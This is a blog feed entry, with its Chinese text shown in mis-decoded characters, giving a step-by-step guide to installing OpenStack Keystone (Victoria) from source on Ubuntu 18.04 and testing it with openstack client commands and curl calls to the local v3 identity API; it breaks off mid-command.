    <id>https://jckling.github.io/2021/05/13/OpenStack/Ubuntu18.04%20%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85%20Keystone%20(Victoria)/</id>
    <published>2021-05-13T02:49:37.000Z</published>
    <updated>2021-10-11T13:39:04.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h1><p>VirtualBox æ­å»º Ubuntu 18.04 è™šæ‹Ÿæœº</p><ul><li>4 å¤„ç†å™¨</li><li>8 GB å†…å­˜</li><li>100 GB ç¡¬ç›˜</li></ul><p>ä½¿ç”¨ä¸¤å—ç½‘å¡</p><ul><li>NAT æä¾›ç½‘ç»œæœåŠ¡</li><li>Host-Only æä¾›å®¿ä¸»æœº ssh è¿æ¥</li></ul><h1 id="å®‰è£…ä¾èµ–"><a href="#å®‰è£…ä¾èµ–" class="headerlink" title="å®‰è£…ä¾èµ–"></a>å®‰è£…ä¾èµ–</h1><p>è®¾ç½® Python3 å’Œ pip3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python</span></span><br><span class="line">sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.6 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># pip</span></span><br><span class="line">sudo update-alternatives --install /usr/bin/pip pip /usr/bin/pip3 1</span><br></pre></td></tr></table></figure><p>ä¸‹è½½ Keystone æºç ï¼ŒæŒ‡å®š Victoria ç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¸‹è½½æºç </span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/keystone.git -b stable/victoria --single-branch</span><br></pre></td></tr></table></figure><p>Keystone çš„å„ç§ä¾èµ–å¯ä»¥æ ¹æ®ä»£ç ç›®å½•ä¸‹æä¾›çš„ bindep.txt è¿›è¡Œå®‰è£…ã€‚ <code>bindep</code> å³ Binary dependency management ï¼Œé€šè¿‡ <code>pip</code> å®‰è£… bindep</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install bindep</span><br></pre></td></tr></table></figure><p>è¿›å…¥ Keystone ç›®å½•å®‰è£…ç›¸å…³ä¾èµ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿›å…¥ç›®å½•</span></span><br><span class="line"><span class="built_in">cd</span> keystone</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…ä¾èµ–</span></span><br><span class="line">sudo apt install $(bindep -b) -y</span><br></pre></td></tr></table></figure><p>å› ä¸º Keystone ä½¿ç”¨ Flask æä¾› WSGI æ¥å£ï¼Œä¾èµ– Apache é©±åŠ¨ï¼Œæ‰€ä»¥è¿˜éœ€è¦å®‰è£…æ”¯æŒ python3 çš„ WSGI æ¨¡å—</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install apache2 libapache2-mod-wsgi-py3</span><br></pre></td></tr></table></figure><p>OpenStack å®¢æˆ·ç«¯ç”¨äºå’Œ Keystone è¿›è¡Œäº¤äº’ï¼Œä½¿ç”¨ pip å®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install python-openstackclient</span><br></pre></td></tr></table></figure><h1 id="éƒ¨ç½²-Keystone"><a href="#éƒ¨ç½²-Keystone" class="headerlink" title="éƒ¨ç½² Keystone"></a>éƒ¨ç½² Keystone</h1><p>ä¸Šé¢çš„æ­¥éª¤åšå¥½äº†å‡†å¤‡ï¼Œæ¥ä¸‹æ¥æ‰§è¡Œ Keystone çš„éƒ¨ç½²ã€‚</p><p>æºç ç›®å½•ä¸­æœ‰ä¸¤ä¸ªä¾èµ–åŒ…æ–‡ä»¶ï¼ˆéƒ½å®‰è£…ï¼‰ï¼Œæˆ–ç›´æ¥ç”¨ <code>-e</code> å‚æ•°å®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£…ä¾èµ–</span></span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">pip install -r test-requirements.txt</span><br><span class="line">pip install -e .</span><br></pre></td></tr></table></figure><p>å®‰è£… tox æµ‹è¯•å·¥å…·ï¼Œç”Ÿæˆé…ç½®æ–‡ä»¶ï¼Œç›¸å…³æ–‡ä»¶ <code>tox.ini</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£… tox</span></span><br><span class="line">pip install tox</span><br><span class="line">tox -e genconfig</span><br></pre></td></tr></table></figure><p>è®¾ç½® MySQL æ•°æ®åº“ root ç”¨æˆ·å¯†ç ï¼Œè¿™é‡Œè®¾ç½®ä¸º <code>mysql</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è®¾ç½®å¯†ç </span></span><br><span class="line">sudo mysql_secure_installation</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç™»å½• MySQL</span></span><br><span class="line">sudo mysql -u root -p</span><br></pre></td></tr></table></figure><p>åˆ›å»ºæ•°æ®åº“å’Œ keystone ç”¨æˆ·ï¼Œå¹¶æˆäºˆç›¸å…³æƒé™</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- åˆ›å»ºæ•°æ®åº“</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> keystone;</span><br><span class="line"></span><br><span class="line"><span class="comment">--- æˆäºˆæƒé™</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> keystone.* <span class="keyword">TO</span> <span class="string">&#x27;keystone&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">&#x27;KEYSTONE_DBPASS&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> keystone.* <span class="keyword">TO</span> <span class="string">&#x27;keystone&#x27;</span>@<span class="string">&#x27;%&#x27;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">&#x27;KEYSTONE_DBPASS&#x27;</span>;</span><br></pre></td></tr></table></figure><p>æ‰‹åŠ¨åˆ›å»ºç›®å½•ï¼Œå°†é…ç½®æ–‡ä»¶æ‹·è´è¿‡å»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºç›®å½•</span></span><br><span class="line">sudo mkdir /etc/keystone</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‹·è´é…ç½®æ–‡ä»¶</span></span><br><span class="line">sudo cp etc/keystone.conf.sample /etc/keystone/keystone.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹é…ç½®æ–‡ä»¶</span></span><br><span class="line">sudo vim /etc/keystone/keystone.conf</span><br></pre></td></tr></table></figure><p>åœ¨ <code>[database]</code> å°èŠ‚ä¸­æ·»åŠ æ•°æ®åº“è¿æ¥é…ç½®</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[database]</span></span><br><span class="line"><span class="attr">connection</span> = mysql+pymysql://keystone:KEYSTONE_DBPASS@localhost/keystone</span><br></pre></td></tr></table></figure><p>å®‰è£… Keystoneï¼Œåˆ›å»ºä»¤ç‰Œæ—¶å¦‚æœæŠ¥é”™æç¤º /etc/keystone/fernet-keys æ–‡ä»¶å¤¹ä¸­å·²æœ‰æ–‡ä»¶ï¼Œåˆ é™¤åå†é‡æ–°æ‰§è¡ŒæŒ‡ä»¤å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£… Keystone</span></span><br><span class="line">sudo python setup.py install</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¡«å……æ•°æ®åº“</span></span><br><span class="line">keystone-manage db_sync</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»¤ç‰Œ</span></span><br><span class="line">sudo mkdir -p /etc/keystone/fernet-keys</span><br><span class="line">sudo keystone-manage fernet_setup --keystone-user jck --keystone-group jck</span><br><span class="line">sudo keystone-manage credential_setup --keystone-user jck --keystone-group jck</span><br></pre></td></tr></table></figure><p>å¯åŠ¨ Keystone æœåŠ¡ï¼Œè®¾ç½®ç®¡ç†å‘˜å¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆå§‹åŒ–</span></span><br><span class="line">keystone-manage bootstrap --bootstrap-password ADMIN_PASS \</span><br><span class="line">  --bootstrap-admin-url http://127.0.0.1:5000/v3/ \</span><br><span class="line">  --bootstrap-internal-url http://127.0.0.1:5000/v3/ \</span><br><span class="line">  --bootstrap-public-url http://127.0.0.1:5000/v3/ \</span><br><span class="line">  --bootstrap-region-id RegionOne</span><br></pre></td></tr></table></figure><p>é…ç½® Apache æœåŠ¡ï¼Œæ‹·è´ Keystone æºç ç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶åˆ° Apache æ–‡ä»¶å¤¹ä¸­ï¼Œä¿®æ”¹ <code>user</code> å’Œ <code>group</code> å­—æ®µä¸ºå½“å‰ç”¨æˆ·ï¼Œå¯ç”¨è¯¥é…ç½®æ–‡ä»¶å¹¶é‡å¯ Apache æœåŠ¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ‹·è´</span></span><br><span class="line">sudo cp httpd/wsgi-keystone.conf /etc/apache2/conf-available/wsgi-keystone.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹</span></span><br><span class="line">sudo vim /etc/apache2/conf-available/wsgi-keystone.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯ç”¨</span></span><br><span class="line">sudo ln -s /etc/apache2/conf-available/wsgi-keystone.conf /etc/apache2/conf-enabled/wsgi-keystone.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># é‡å¯ Apache</span></span><br><span class="line">sudo service apache2 restart</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/06/06/xOyfkLrbKFqCnXh.png"><p>é‡æ–°éƒ¨ç½²åªéœ€è¦é‡æ–°æ‰§è¡Œå®‰è£…å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><h1 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h1><p>é…ç½®ç¯å¢ƒå˜é‡åå¯è®¿é—® Keystone æœåŠ¡ï¼Œä½¿ç”¨ç®¡ç†å‘˜å¸å·ï¼Œå¹¶æŒ‡å®šè®¤è¯ä½¿ç”¨çš„ url å’Œç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç¯å¢ƒå˜é‡</span></span><br><span class="line"><span class="built_in">export</span> OS_USERNAME=admin</span><br><span class="line"><span class="built_in">export</span> OS_PASSWORD=ADMIN_PASS</span><br><span class="line"><span class="built_in">export</span> OS_PROJECT_NAME=admin</span><br><span class="line"><span class="built_in">export</span> OS_USER_DOMAIN_NAME=Default</span><br><span class="line"><span class="built_in">export</span> OS_PROJECT_DOMAIN_NAME=Default</span><br><span class="line"><span class="built_in">export</span> OS_AUTH_URL=http://127.0.0.1:5000/v3</span><br><span class="line"><span class="built_in">export</span> OS_IDENTITY_API_VERSION=3</span><br></pre></td></tr></table></figure><h2 id="OpenStack-Client"><a href="#OpenStack-Client" class="headerlink" title="OpenStack Client"></a>OpenStack Client</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥è¯¢ç”¨æˆ·åˆ—è¡¨</span></span><br><span class="line">openstack user list</span><br></pre></td></tr></table></figure><h2 id="OpenStack-API"><a href="#OpenStack-API" class="headerlink" title="OpenStack API"></a>OpenStack API</h2><p>è®¾ç½®ç¯å¢ƒå˜é‡åæ‰èƒ½æ­£ç¡®æ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¡Œè¯­å¥ã€‚</p><ol><li><p>è·å– API ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s http://localhost:5000 \</span><br><span class="line">  | python -mjson.tool</span><br></pre></td></tr></table></figure></li><li><p>è·å– token ï¼ŒæŒ‡å®š project/domain èŒƒå›´</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Unscoped</span></span><br><span class="line">curl -i <span class="string">&quot;http://localhost:5000/v3/auth/tokens&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#123; &quot;auth&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;identity&quot;: &#123;</span></span><br><span class="line"><span class="string">      &quot;methods&quot;: [&quot;password&quot;],</span></span><br><span class="line"><span class="string">      &quot;password&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;user&quot;: &#123;</span></span><br><span class="line"><span class="string">          &quot;name&quot;: &quot;admin&quot;,</span></span><br><span class="line"><span class="string">          &quot;domain&quot;: &#123; &quot;id&quot;: &quot;default&quot; &#125;,</span></span><br><span class="line"><span class="string">          &quot;password&quot;: &quot;ADMIN_PASS&quot;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Project-Scoped</span></span><br><span class="line">curl -i <span class="string">&quot;http://localhost:5000/v3/auth/tokens&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#123; &quot;auth&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;identity&quot;: &#123;</span></span><br><span class="line"><span class="string">      &quot;methods&quot;: [&quot;password&quot;],</span></span><br><span class="line"><span class="string">      &quot;password&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;user&quot;: &#123;</span></span><br><span class="line"><span class="string">          &quot;name&quot;: &quot;admin&quot;,</span></span><br><span class="line"><span class="string">          &quot;domain&quot;: &#123; &quot;id&quot;: &quot;default&quot; &#125;,</span></span><br><span class="line"><span class="string">          &quot;password&quot;: &quot;ADMIN_PASS&quot;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    &quot;scope&quot;: &#123;</span></span><br><span class="line"><span class="string">      &quot;project&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;name&quot;: &quot;admin&quot;,</span></span><br><span class="line"><span class="string">        &quot;domain&quot;: &#123; &quot;id&quot;: &quot;default&quot; &#125;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Domain-Scopedï¼ˆå‰æï¼šè§’è‰²ç»‘å®šåˆ°åŸŸä¸Šï¼‰</span></span><br><span class="line">curl -i <span class="string">&quot;http://localhost:5000/v3/auth/tokens&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#123; &quot;auth&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;identity&quot;: &#123;</span></span><br><span class="line"><span class="string">      &quot;methods&quot;: [&quot;password&quot;],</span></span><br><span class="line"><span class="string">      &quot;password&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;user&quot;: &#123;</span></span><br><span class="line"><span class="string">          &quot;name&quot;: &quot;admin&quot;,</span></span><br><span class="line"><span class="string">          &quot;domain&quot;: &#123; &quot;id&quot;: &quot;default&quot; &#125;,</span></span><br><span class="line"><span class="string">          &quot;password&quot;: &quot;ADMIN_PASS&quot;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    &quot;scope&quot;: &#123;</span></span><br><span class="line"><span class="string">      &quot;domain&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;id&quot;: &quot;default&quot;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨ token è·å–æ–°çš„ token</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># X-Subject-Token å­—æ®µå°±æ˜¯ token</span></span><br><span class="line"><span class="built_in">export</span> OS_TOKEN=gAAAAABgdpLGBSoQy0KT68qlRT_i7BPdN67KVUg2To53yxPJFcSwNucacaNxVNT_Ca11ASIovOFsyw8OZfCkgLDC7YHA-h5--DvUZ8JX8cLv340-jE2mc1YFZmRmzocnNXS3i-TQ2X6Czk2CNSPeNqbpw7wWV3X3qg</span><br><span class="line"></span><br><span class="line">curl -i <span class="string">&quot;http://localhost:5000/v3/auth/tokens&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#123; &quot;auth&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;identity&quot;: &#123;</span></span><br><span class="line"><span class="string">      &quot;methods&quot;: [&quot;token&quot;],</span></span><br><span class="line"><span class="string">      &quot;token&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;id&quot;: &quot;&#x27;</span><span class="variable">$OS_TOKEN</span><span class="string">&#x27;&quot;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>åˆ é™¤ tokenï¼ˆè¿”å› 204ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X DELETE \</span><br><span class="line">  -H <span class="string">&quot;X-Auth-Token: <span class="variable">$OS_TOKEN</span>&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;X-Subject-Token: <span class="variable">$OS_TOKEN</span>&quot;</span> \</span><br><span class="line">  <span class="string">&quot;http://localhost:5000/v3/auth/tokens&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>åˆ—å‡º domainï¼ˆé¡¹ç›®èŒƒå›´çš„ tokenï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://localhost:5000/v3/domains&quot;</span>\</span><br><span class="line">  -H <span class="string">&quot;X-Auth-Token: <span class="variable">$OS_TOKEN</span>&quot;</span> \</span><br><span class="line">  | python -mjson.tool</span><br></pre></td></tr></table></figure></li><li><p>åˆ›å»º domain</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://localhost:5000/v3/domains&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;X-Auth-Token: <span class="variable">$OS_TOKEN</span>&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123; &quot;domain&quot;: &#123; &quot;name&quot;: &quot;newdomain&quot; &#125; &#125;&#x27;</span> \</span><br><span class="line">  | python -mjson.tool</span><br></pre></td></tr></table></figure></li><li><p>æ›´æ–° domain çŠ¶æ€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># domain_id</span></span><br><span class="line">curl -s -X PATCH \</span><br><span class="line">  -H <span class="string">&quot;X-Auth-Token: <span class="variable">$OS_TOKEN</span>&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123; &quot;domain&quot;: &#123; &quot;enabled&quot;: false &#125; &#125;&#x27;</span> \</span><br><span class="line">  <span class="string">&quot;http://localhost:5000/v3/domains/d94c8df6149146ae9fd3aa50544789b4&quot;</span> \</span><br><span class="line">  | python -mjson.tool</span><br></pre></td></tr></table></figure></li><li><p>åˆ é™¤ domainï¼ˆè¿”å› 204ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># domain_id</span></span><br><span class="line">curl -i -X DELETE \</span><br><span class="line">  -H <span class="string">&quot;X-Auth-Token: <span class="variable">$OS_TOKEN</span>&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  <span class="string">&quot;http://localhost:5000/v3/domains/d94c8df6149146ae9fd3aa50544789b4&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>åˆ—å‡º project</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://localhost:5000/v3/projects&quot;</span> \</span><br><span class="line">-H <span class="string">&quot;X-Auth-Token: <span class="variable">$OS_TOKEN</span>&quot;</span> \</span><br><span class="line">| python -mjson.tool</span><br></pre></td></tr></table></figure></li><li><p>åˆ›å»º project</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://localhost:5000/v3/projects&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;X-Auth-Token: <span class="variable">$OS_TOKEN</span>&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123; &quot;project&quot;: &#123; &quot;name&quot;: &quot;newproject&quot; &#125; &#125;&#x27;</span> \</span><br><span class="line">  | python -mjson.tool</span><br></pre></td></tr></table></figure></li><li><p>ç¦ç”¨ project</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># project_id</span></span><br><span class="line">curl -s -X PATCH \</span><br><span class="line">  -H <span class="string">&quot;X-Auth-Token: <span class="variable">$OS_TOKEN</span>&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123; &quot;project&quot;: &#123; &quot;enabled&quot;: false &#125; &#125;&#x27;</span> \</span><br><span class="line">  <span class="string">&quot;http://localhost:5000/v3/projects/7f926f22b2784dfba2687aad2e2d1283&quot;</span> \</span><br><span class="line">  | python -mjson.tool</span><br></pre></td></tr></table></figure></li><li><p>åˆ é™¤ projectï¼ˆè¿”å› 204ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># project_id</span></span><br><span class="line">curl -i -X DELETE \</span><br><span class="line">  -H <span class="string">&quot;X-Auth-Token: <span class="variable">$OS_TOKEN</span>&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  <span class="string">&quot;http://localhost:5000/v3/projects/7f926f22b2784dfba2687aad2e2d1283&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>åˆ—å‡ºæœåŠ¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://localhost:5000/v3/services&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;X-Auth-Token: <span class="variable">$OS_TOKEN</span>&quot;</span> \</span><br><span class="line">  | python -mjson.tool</span><br></pre></td></tr></table></figure></li><li><p>åˆ—å‡ºç«¯ç‚¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://localhost:5000/v3/endpoints&quot;</span>\</span><br><span class="line">-H <span class="string">&quot;X-Auth-Token: <span 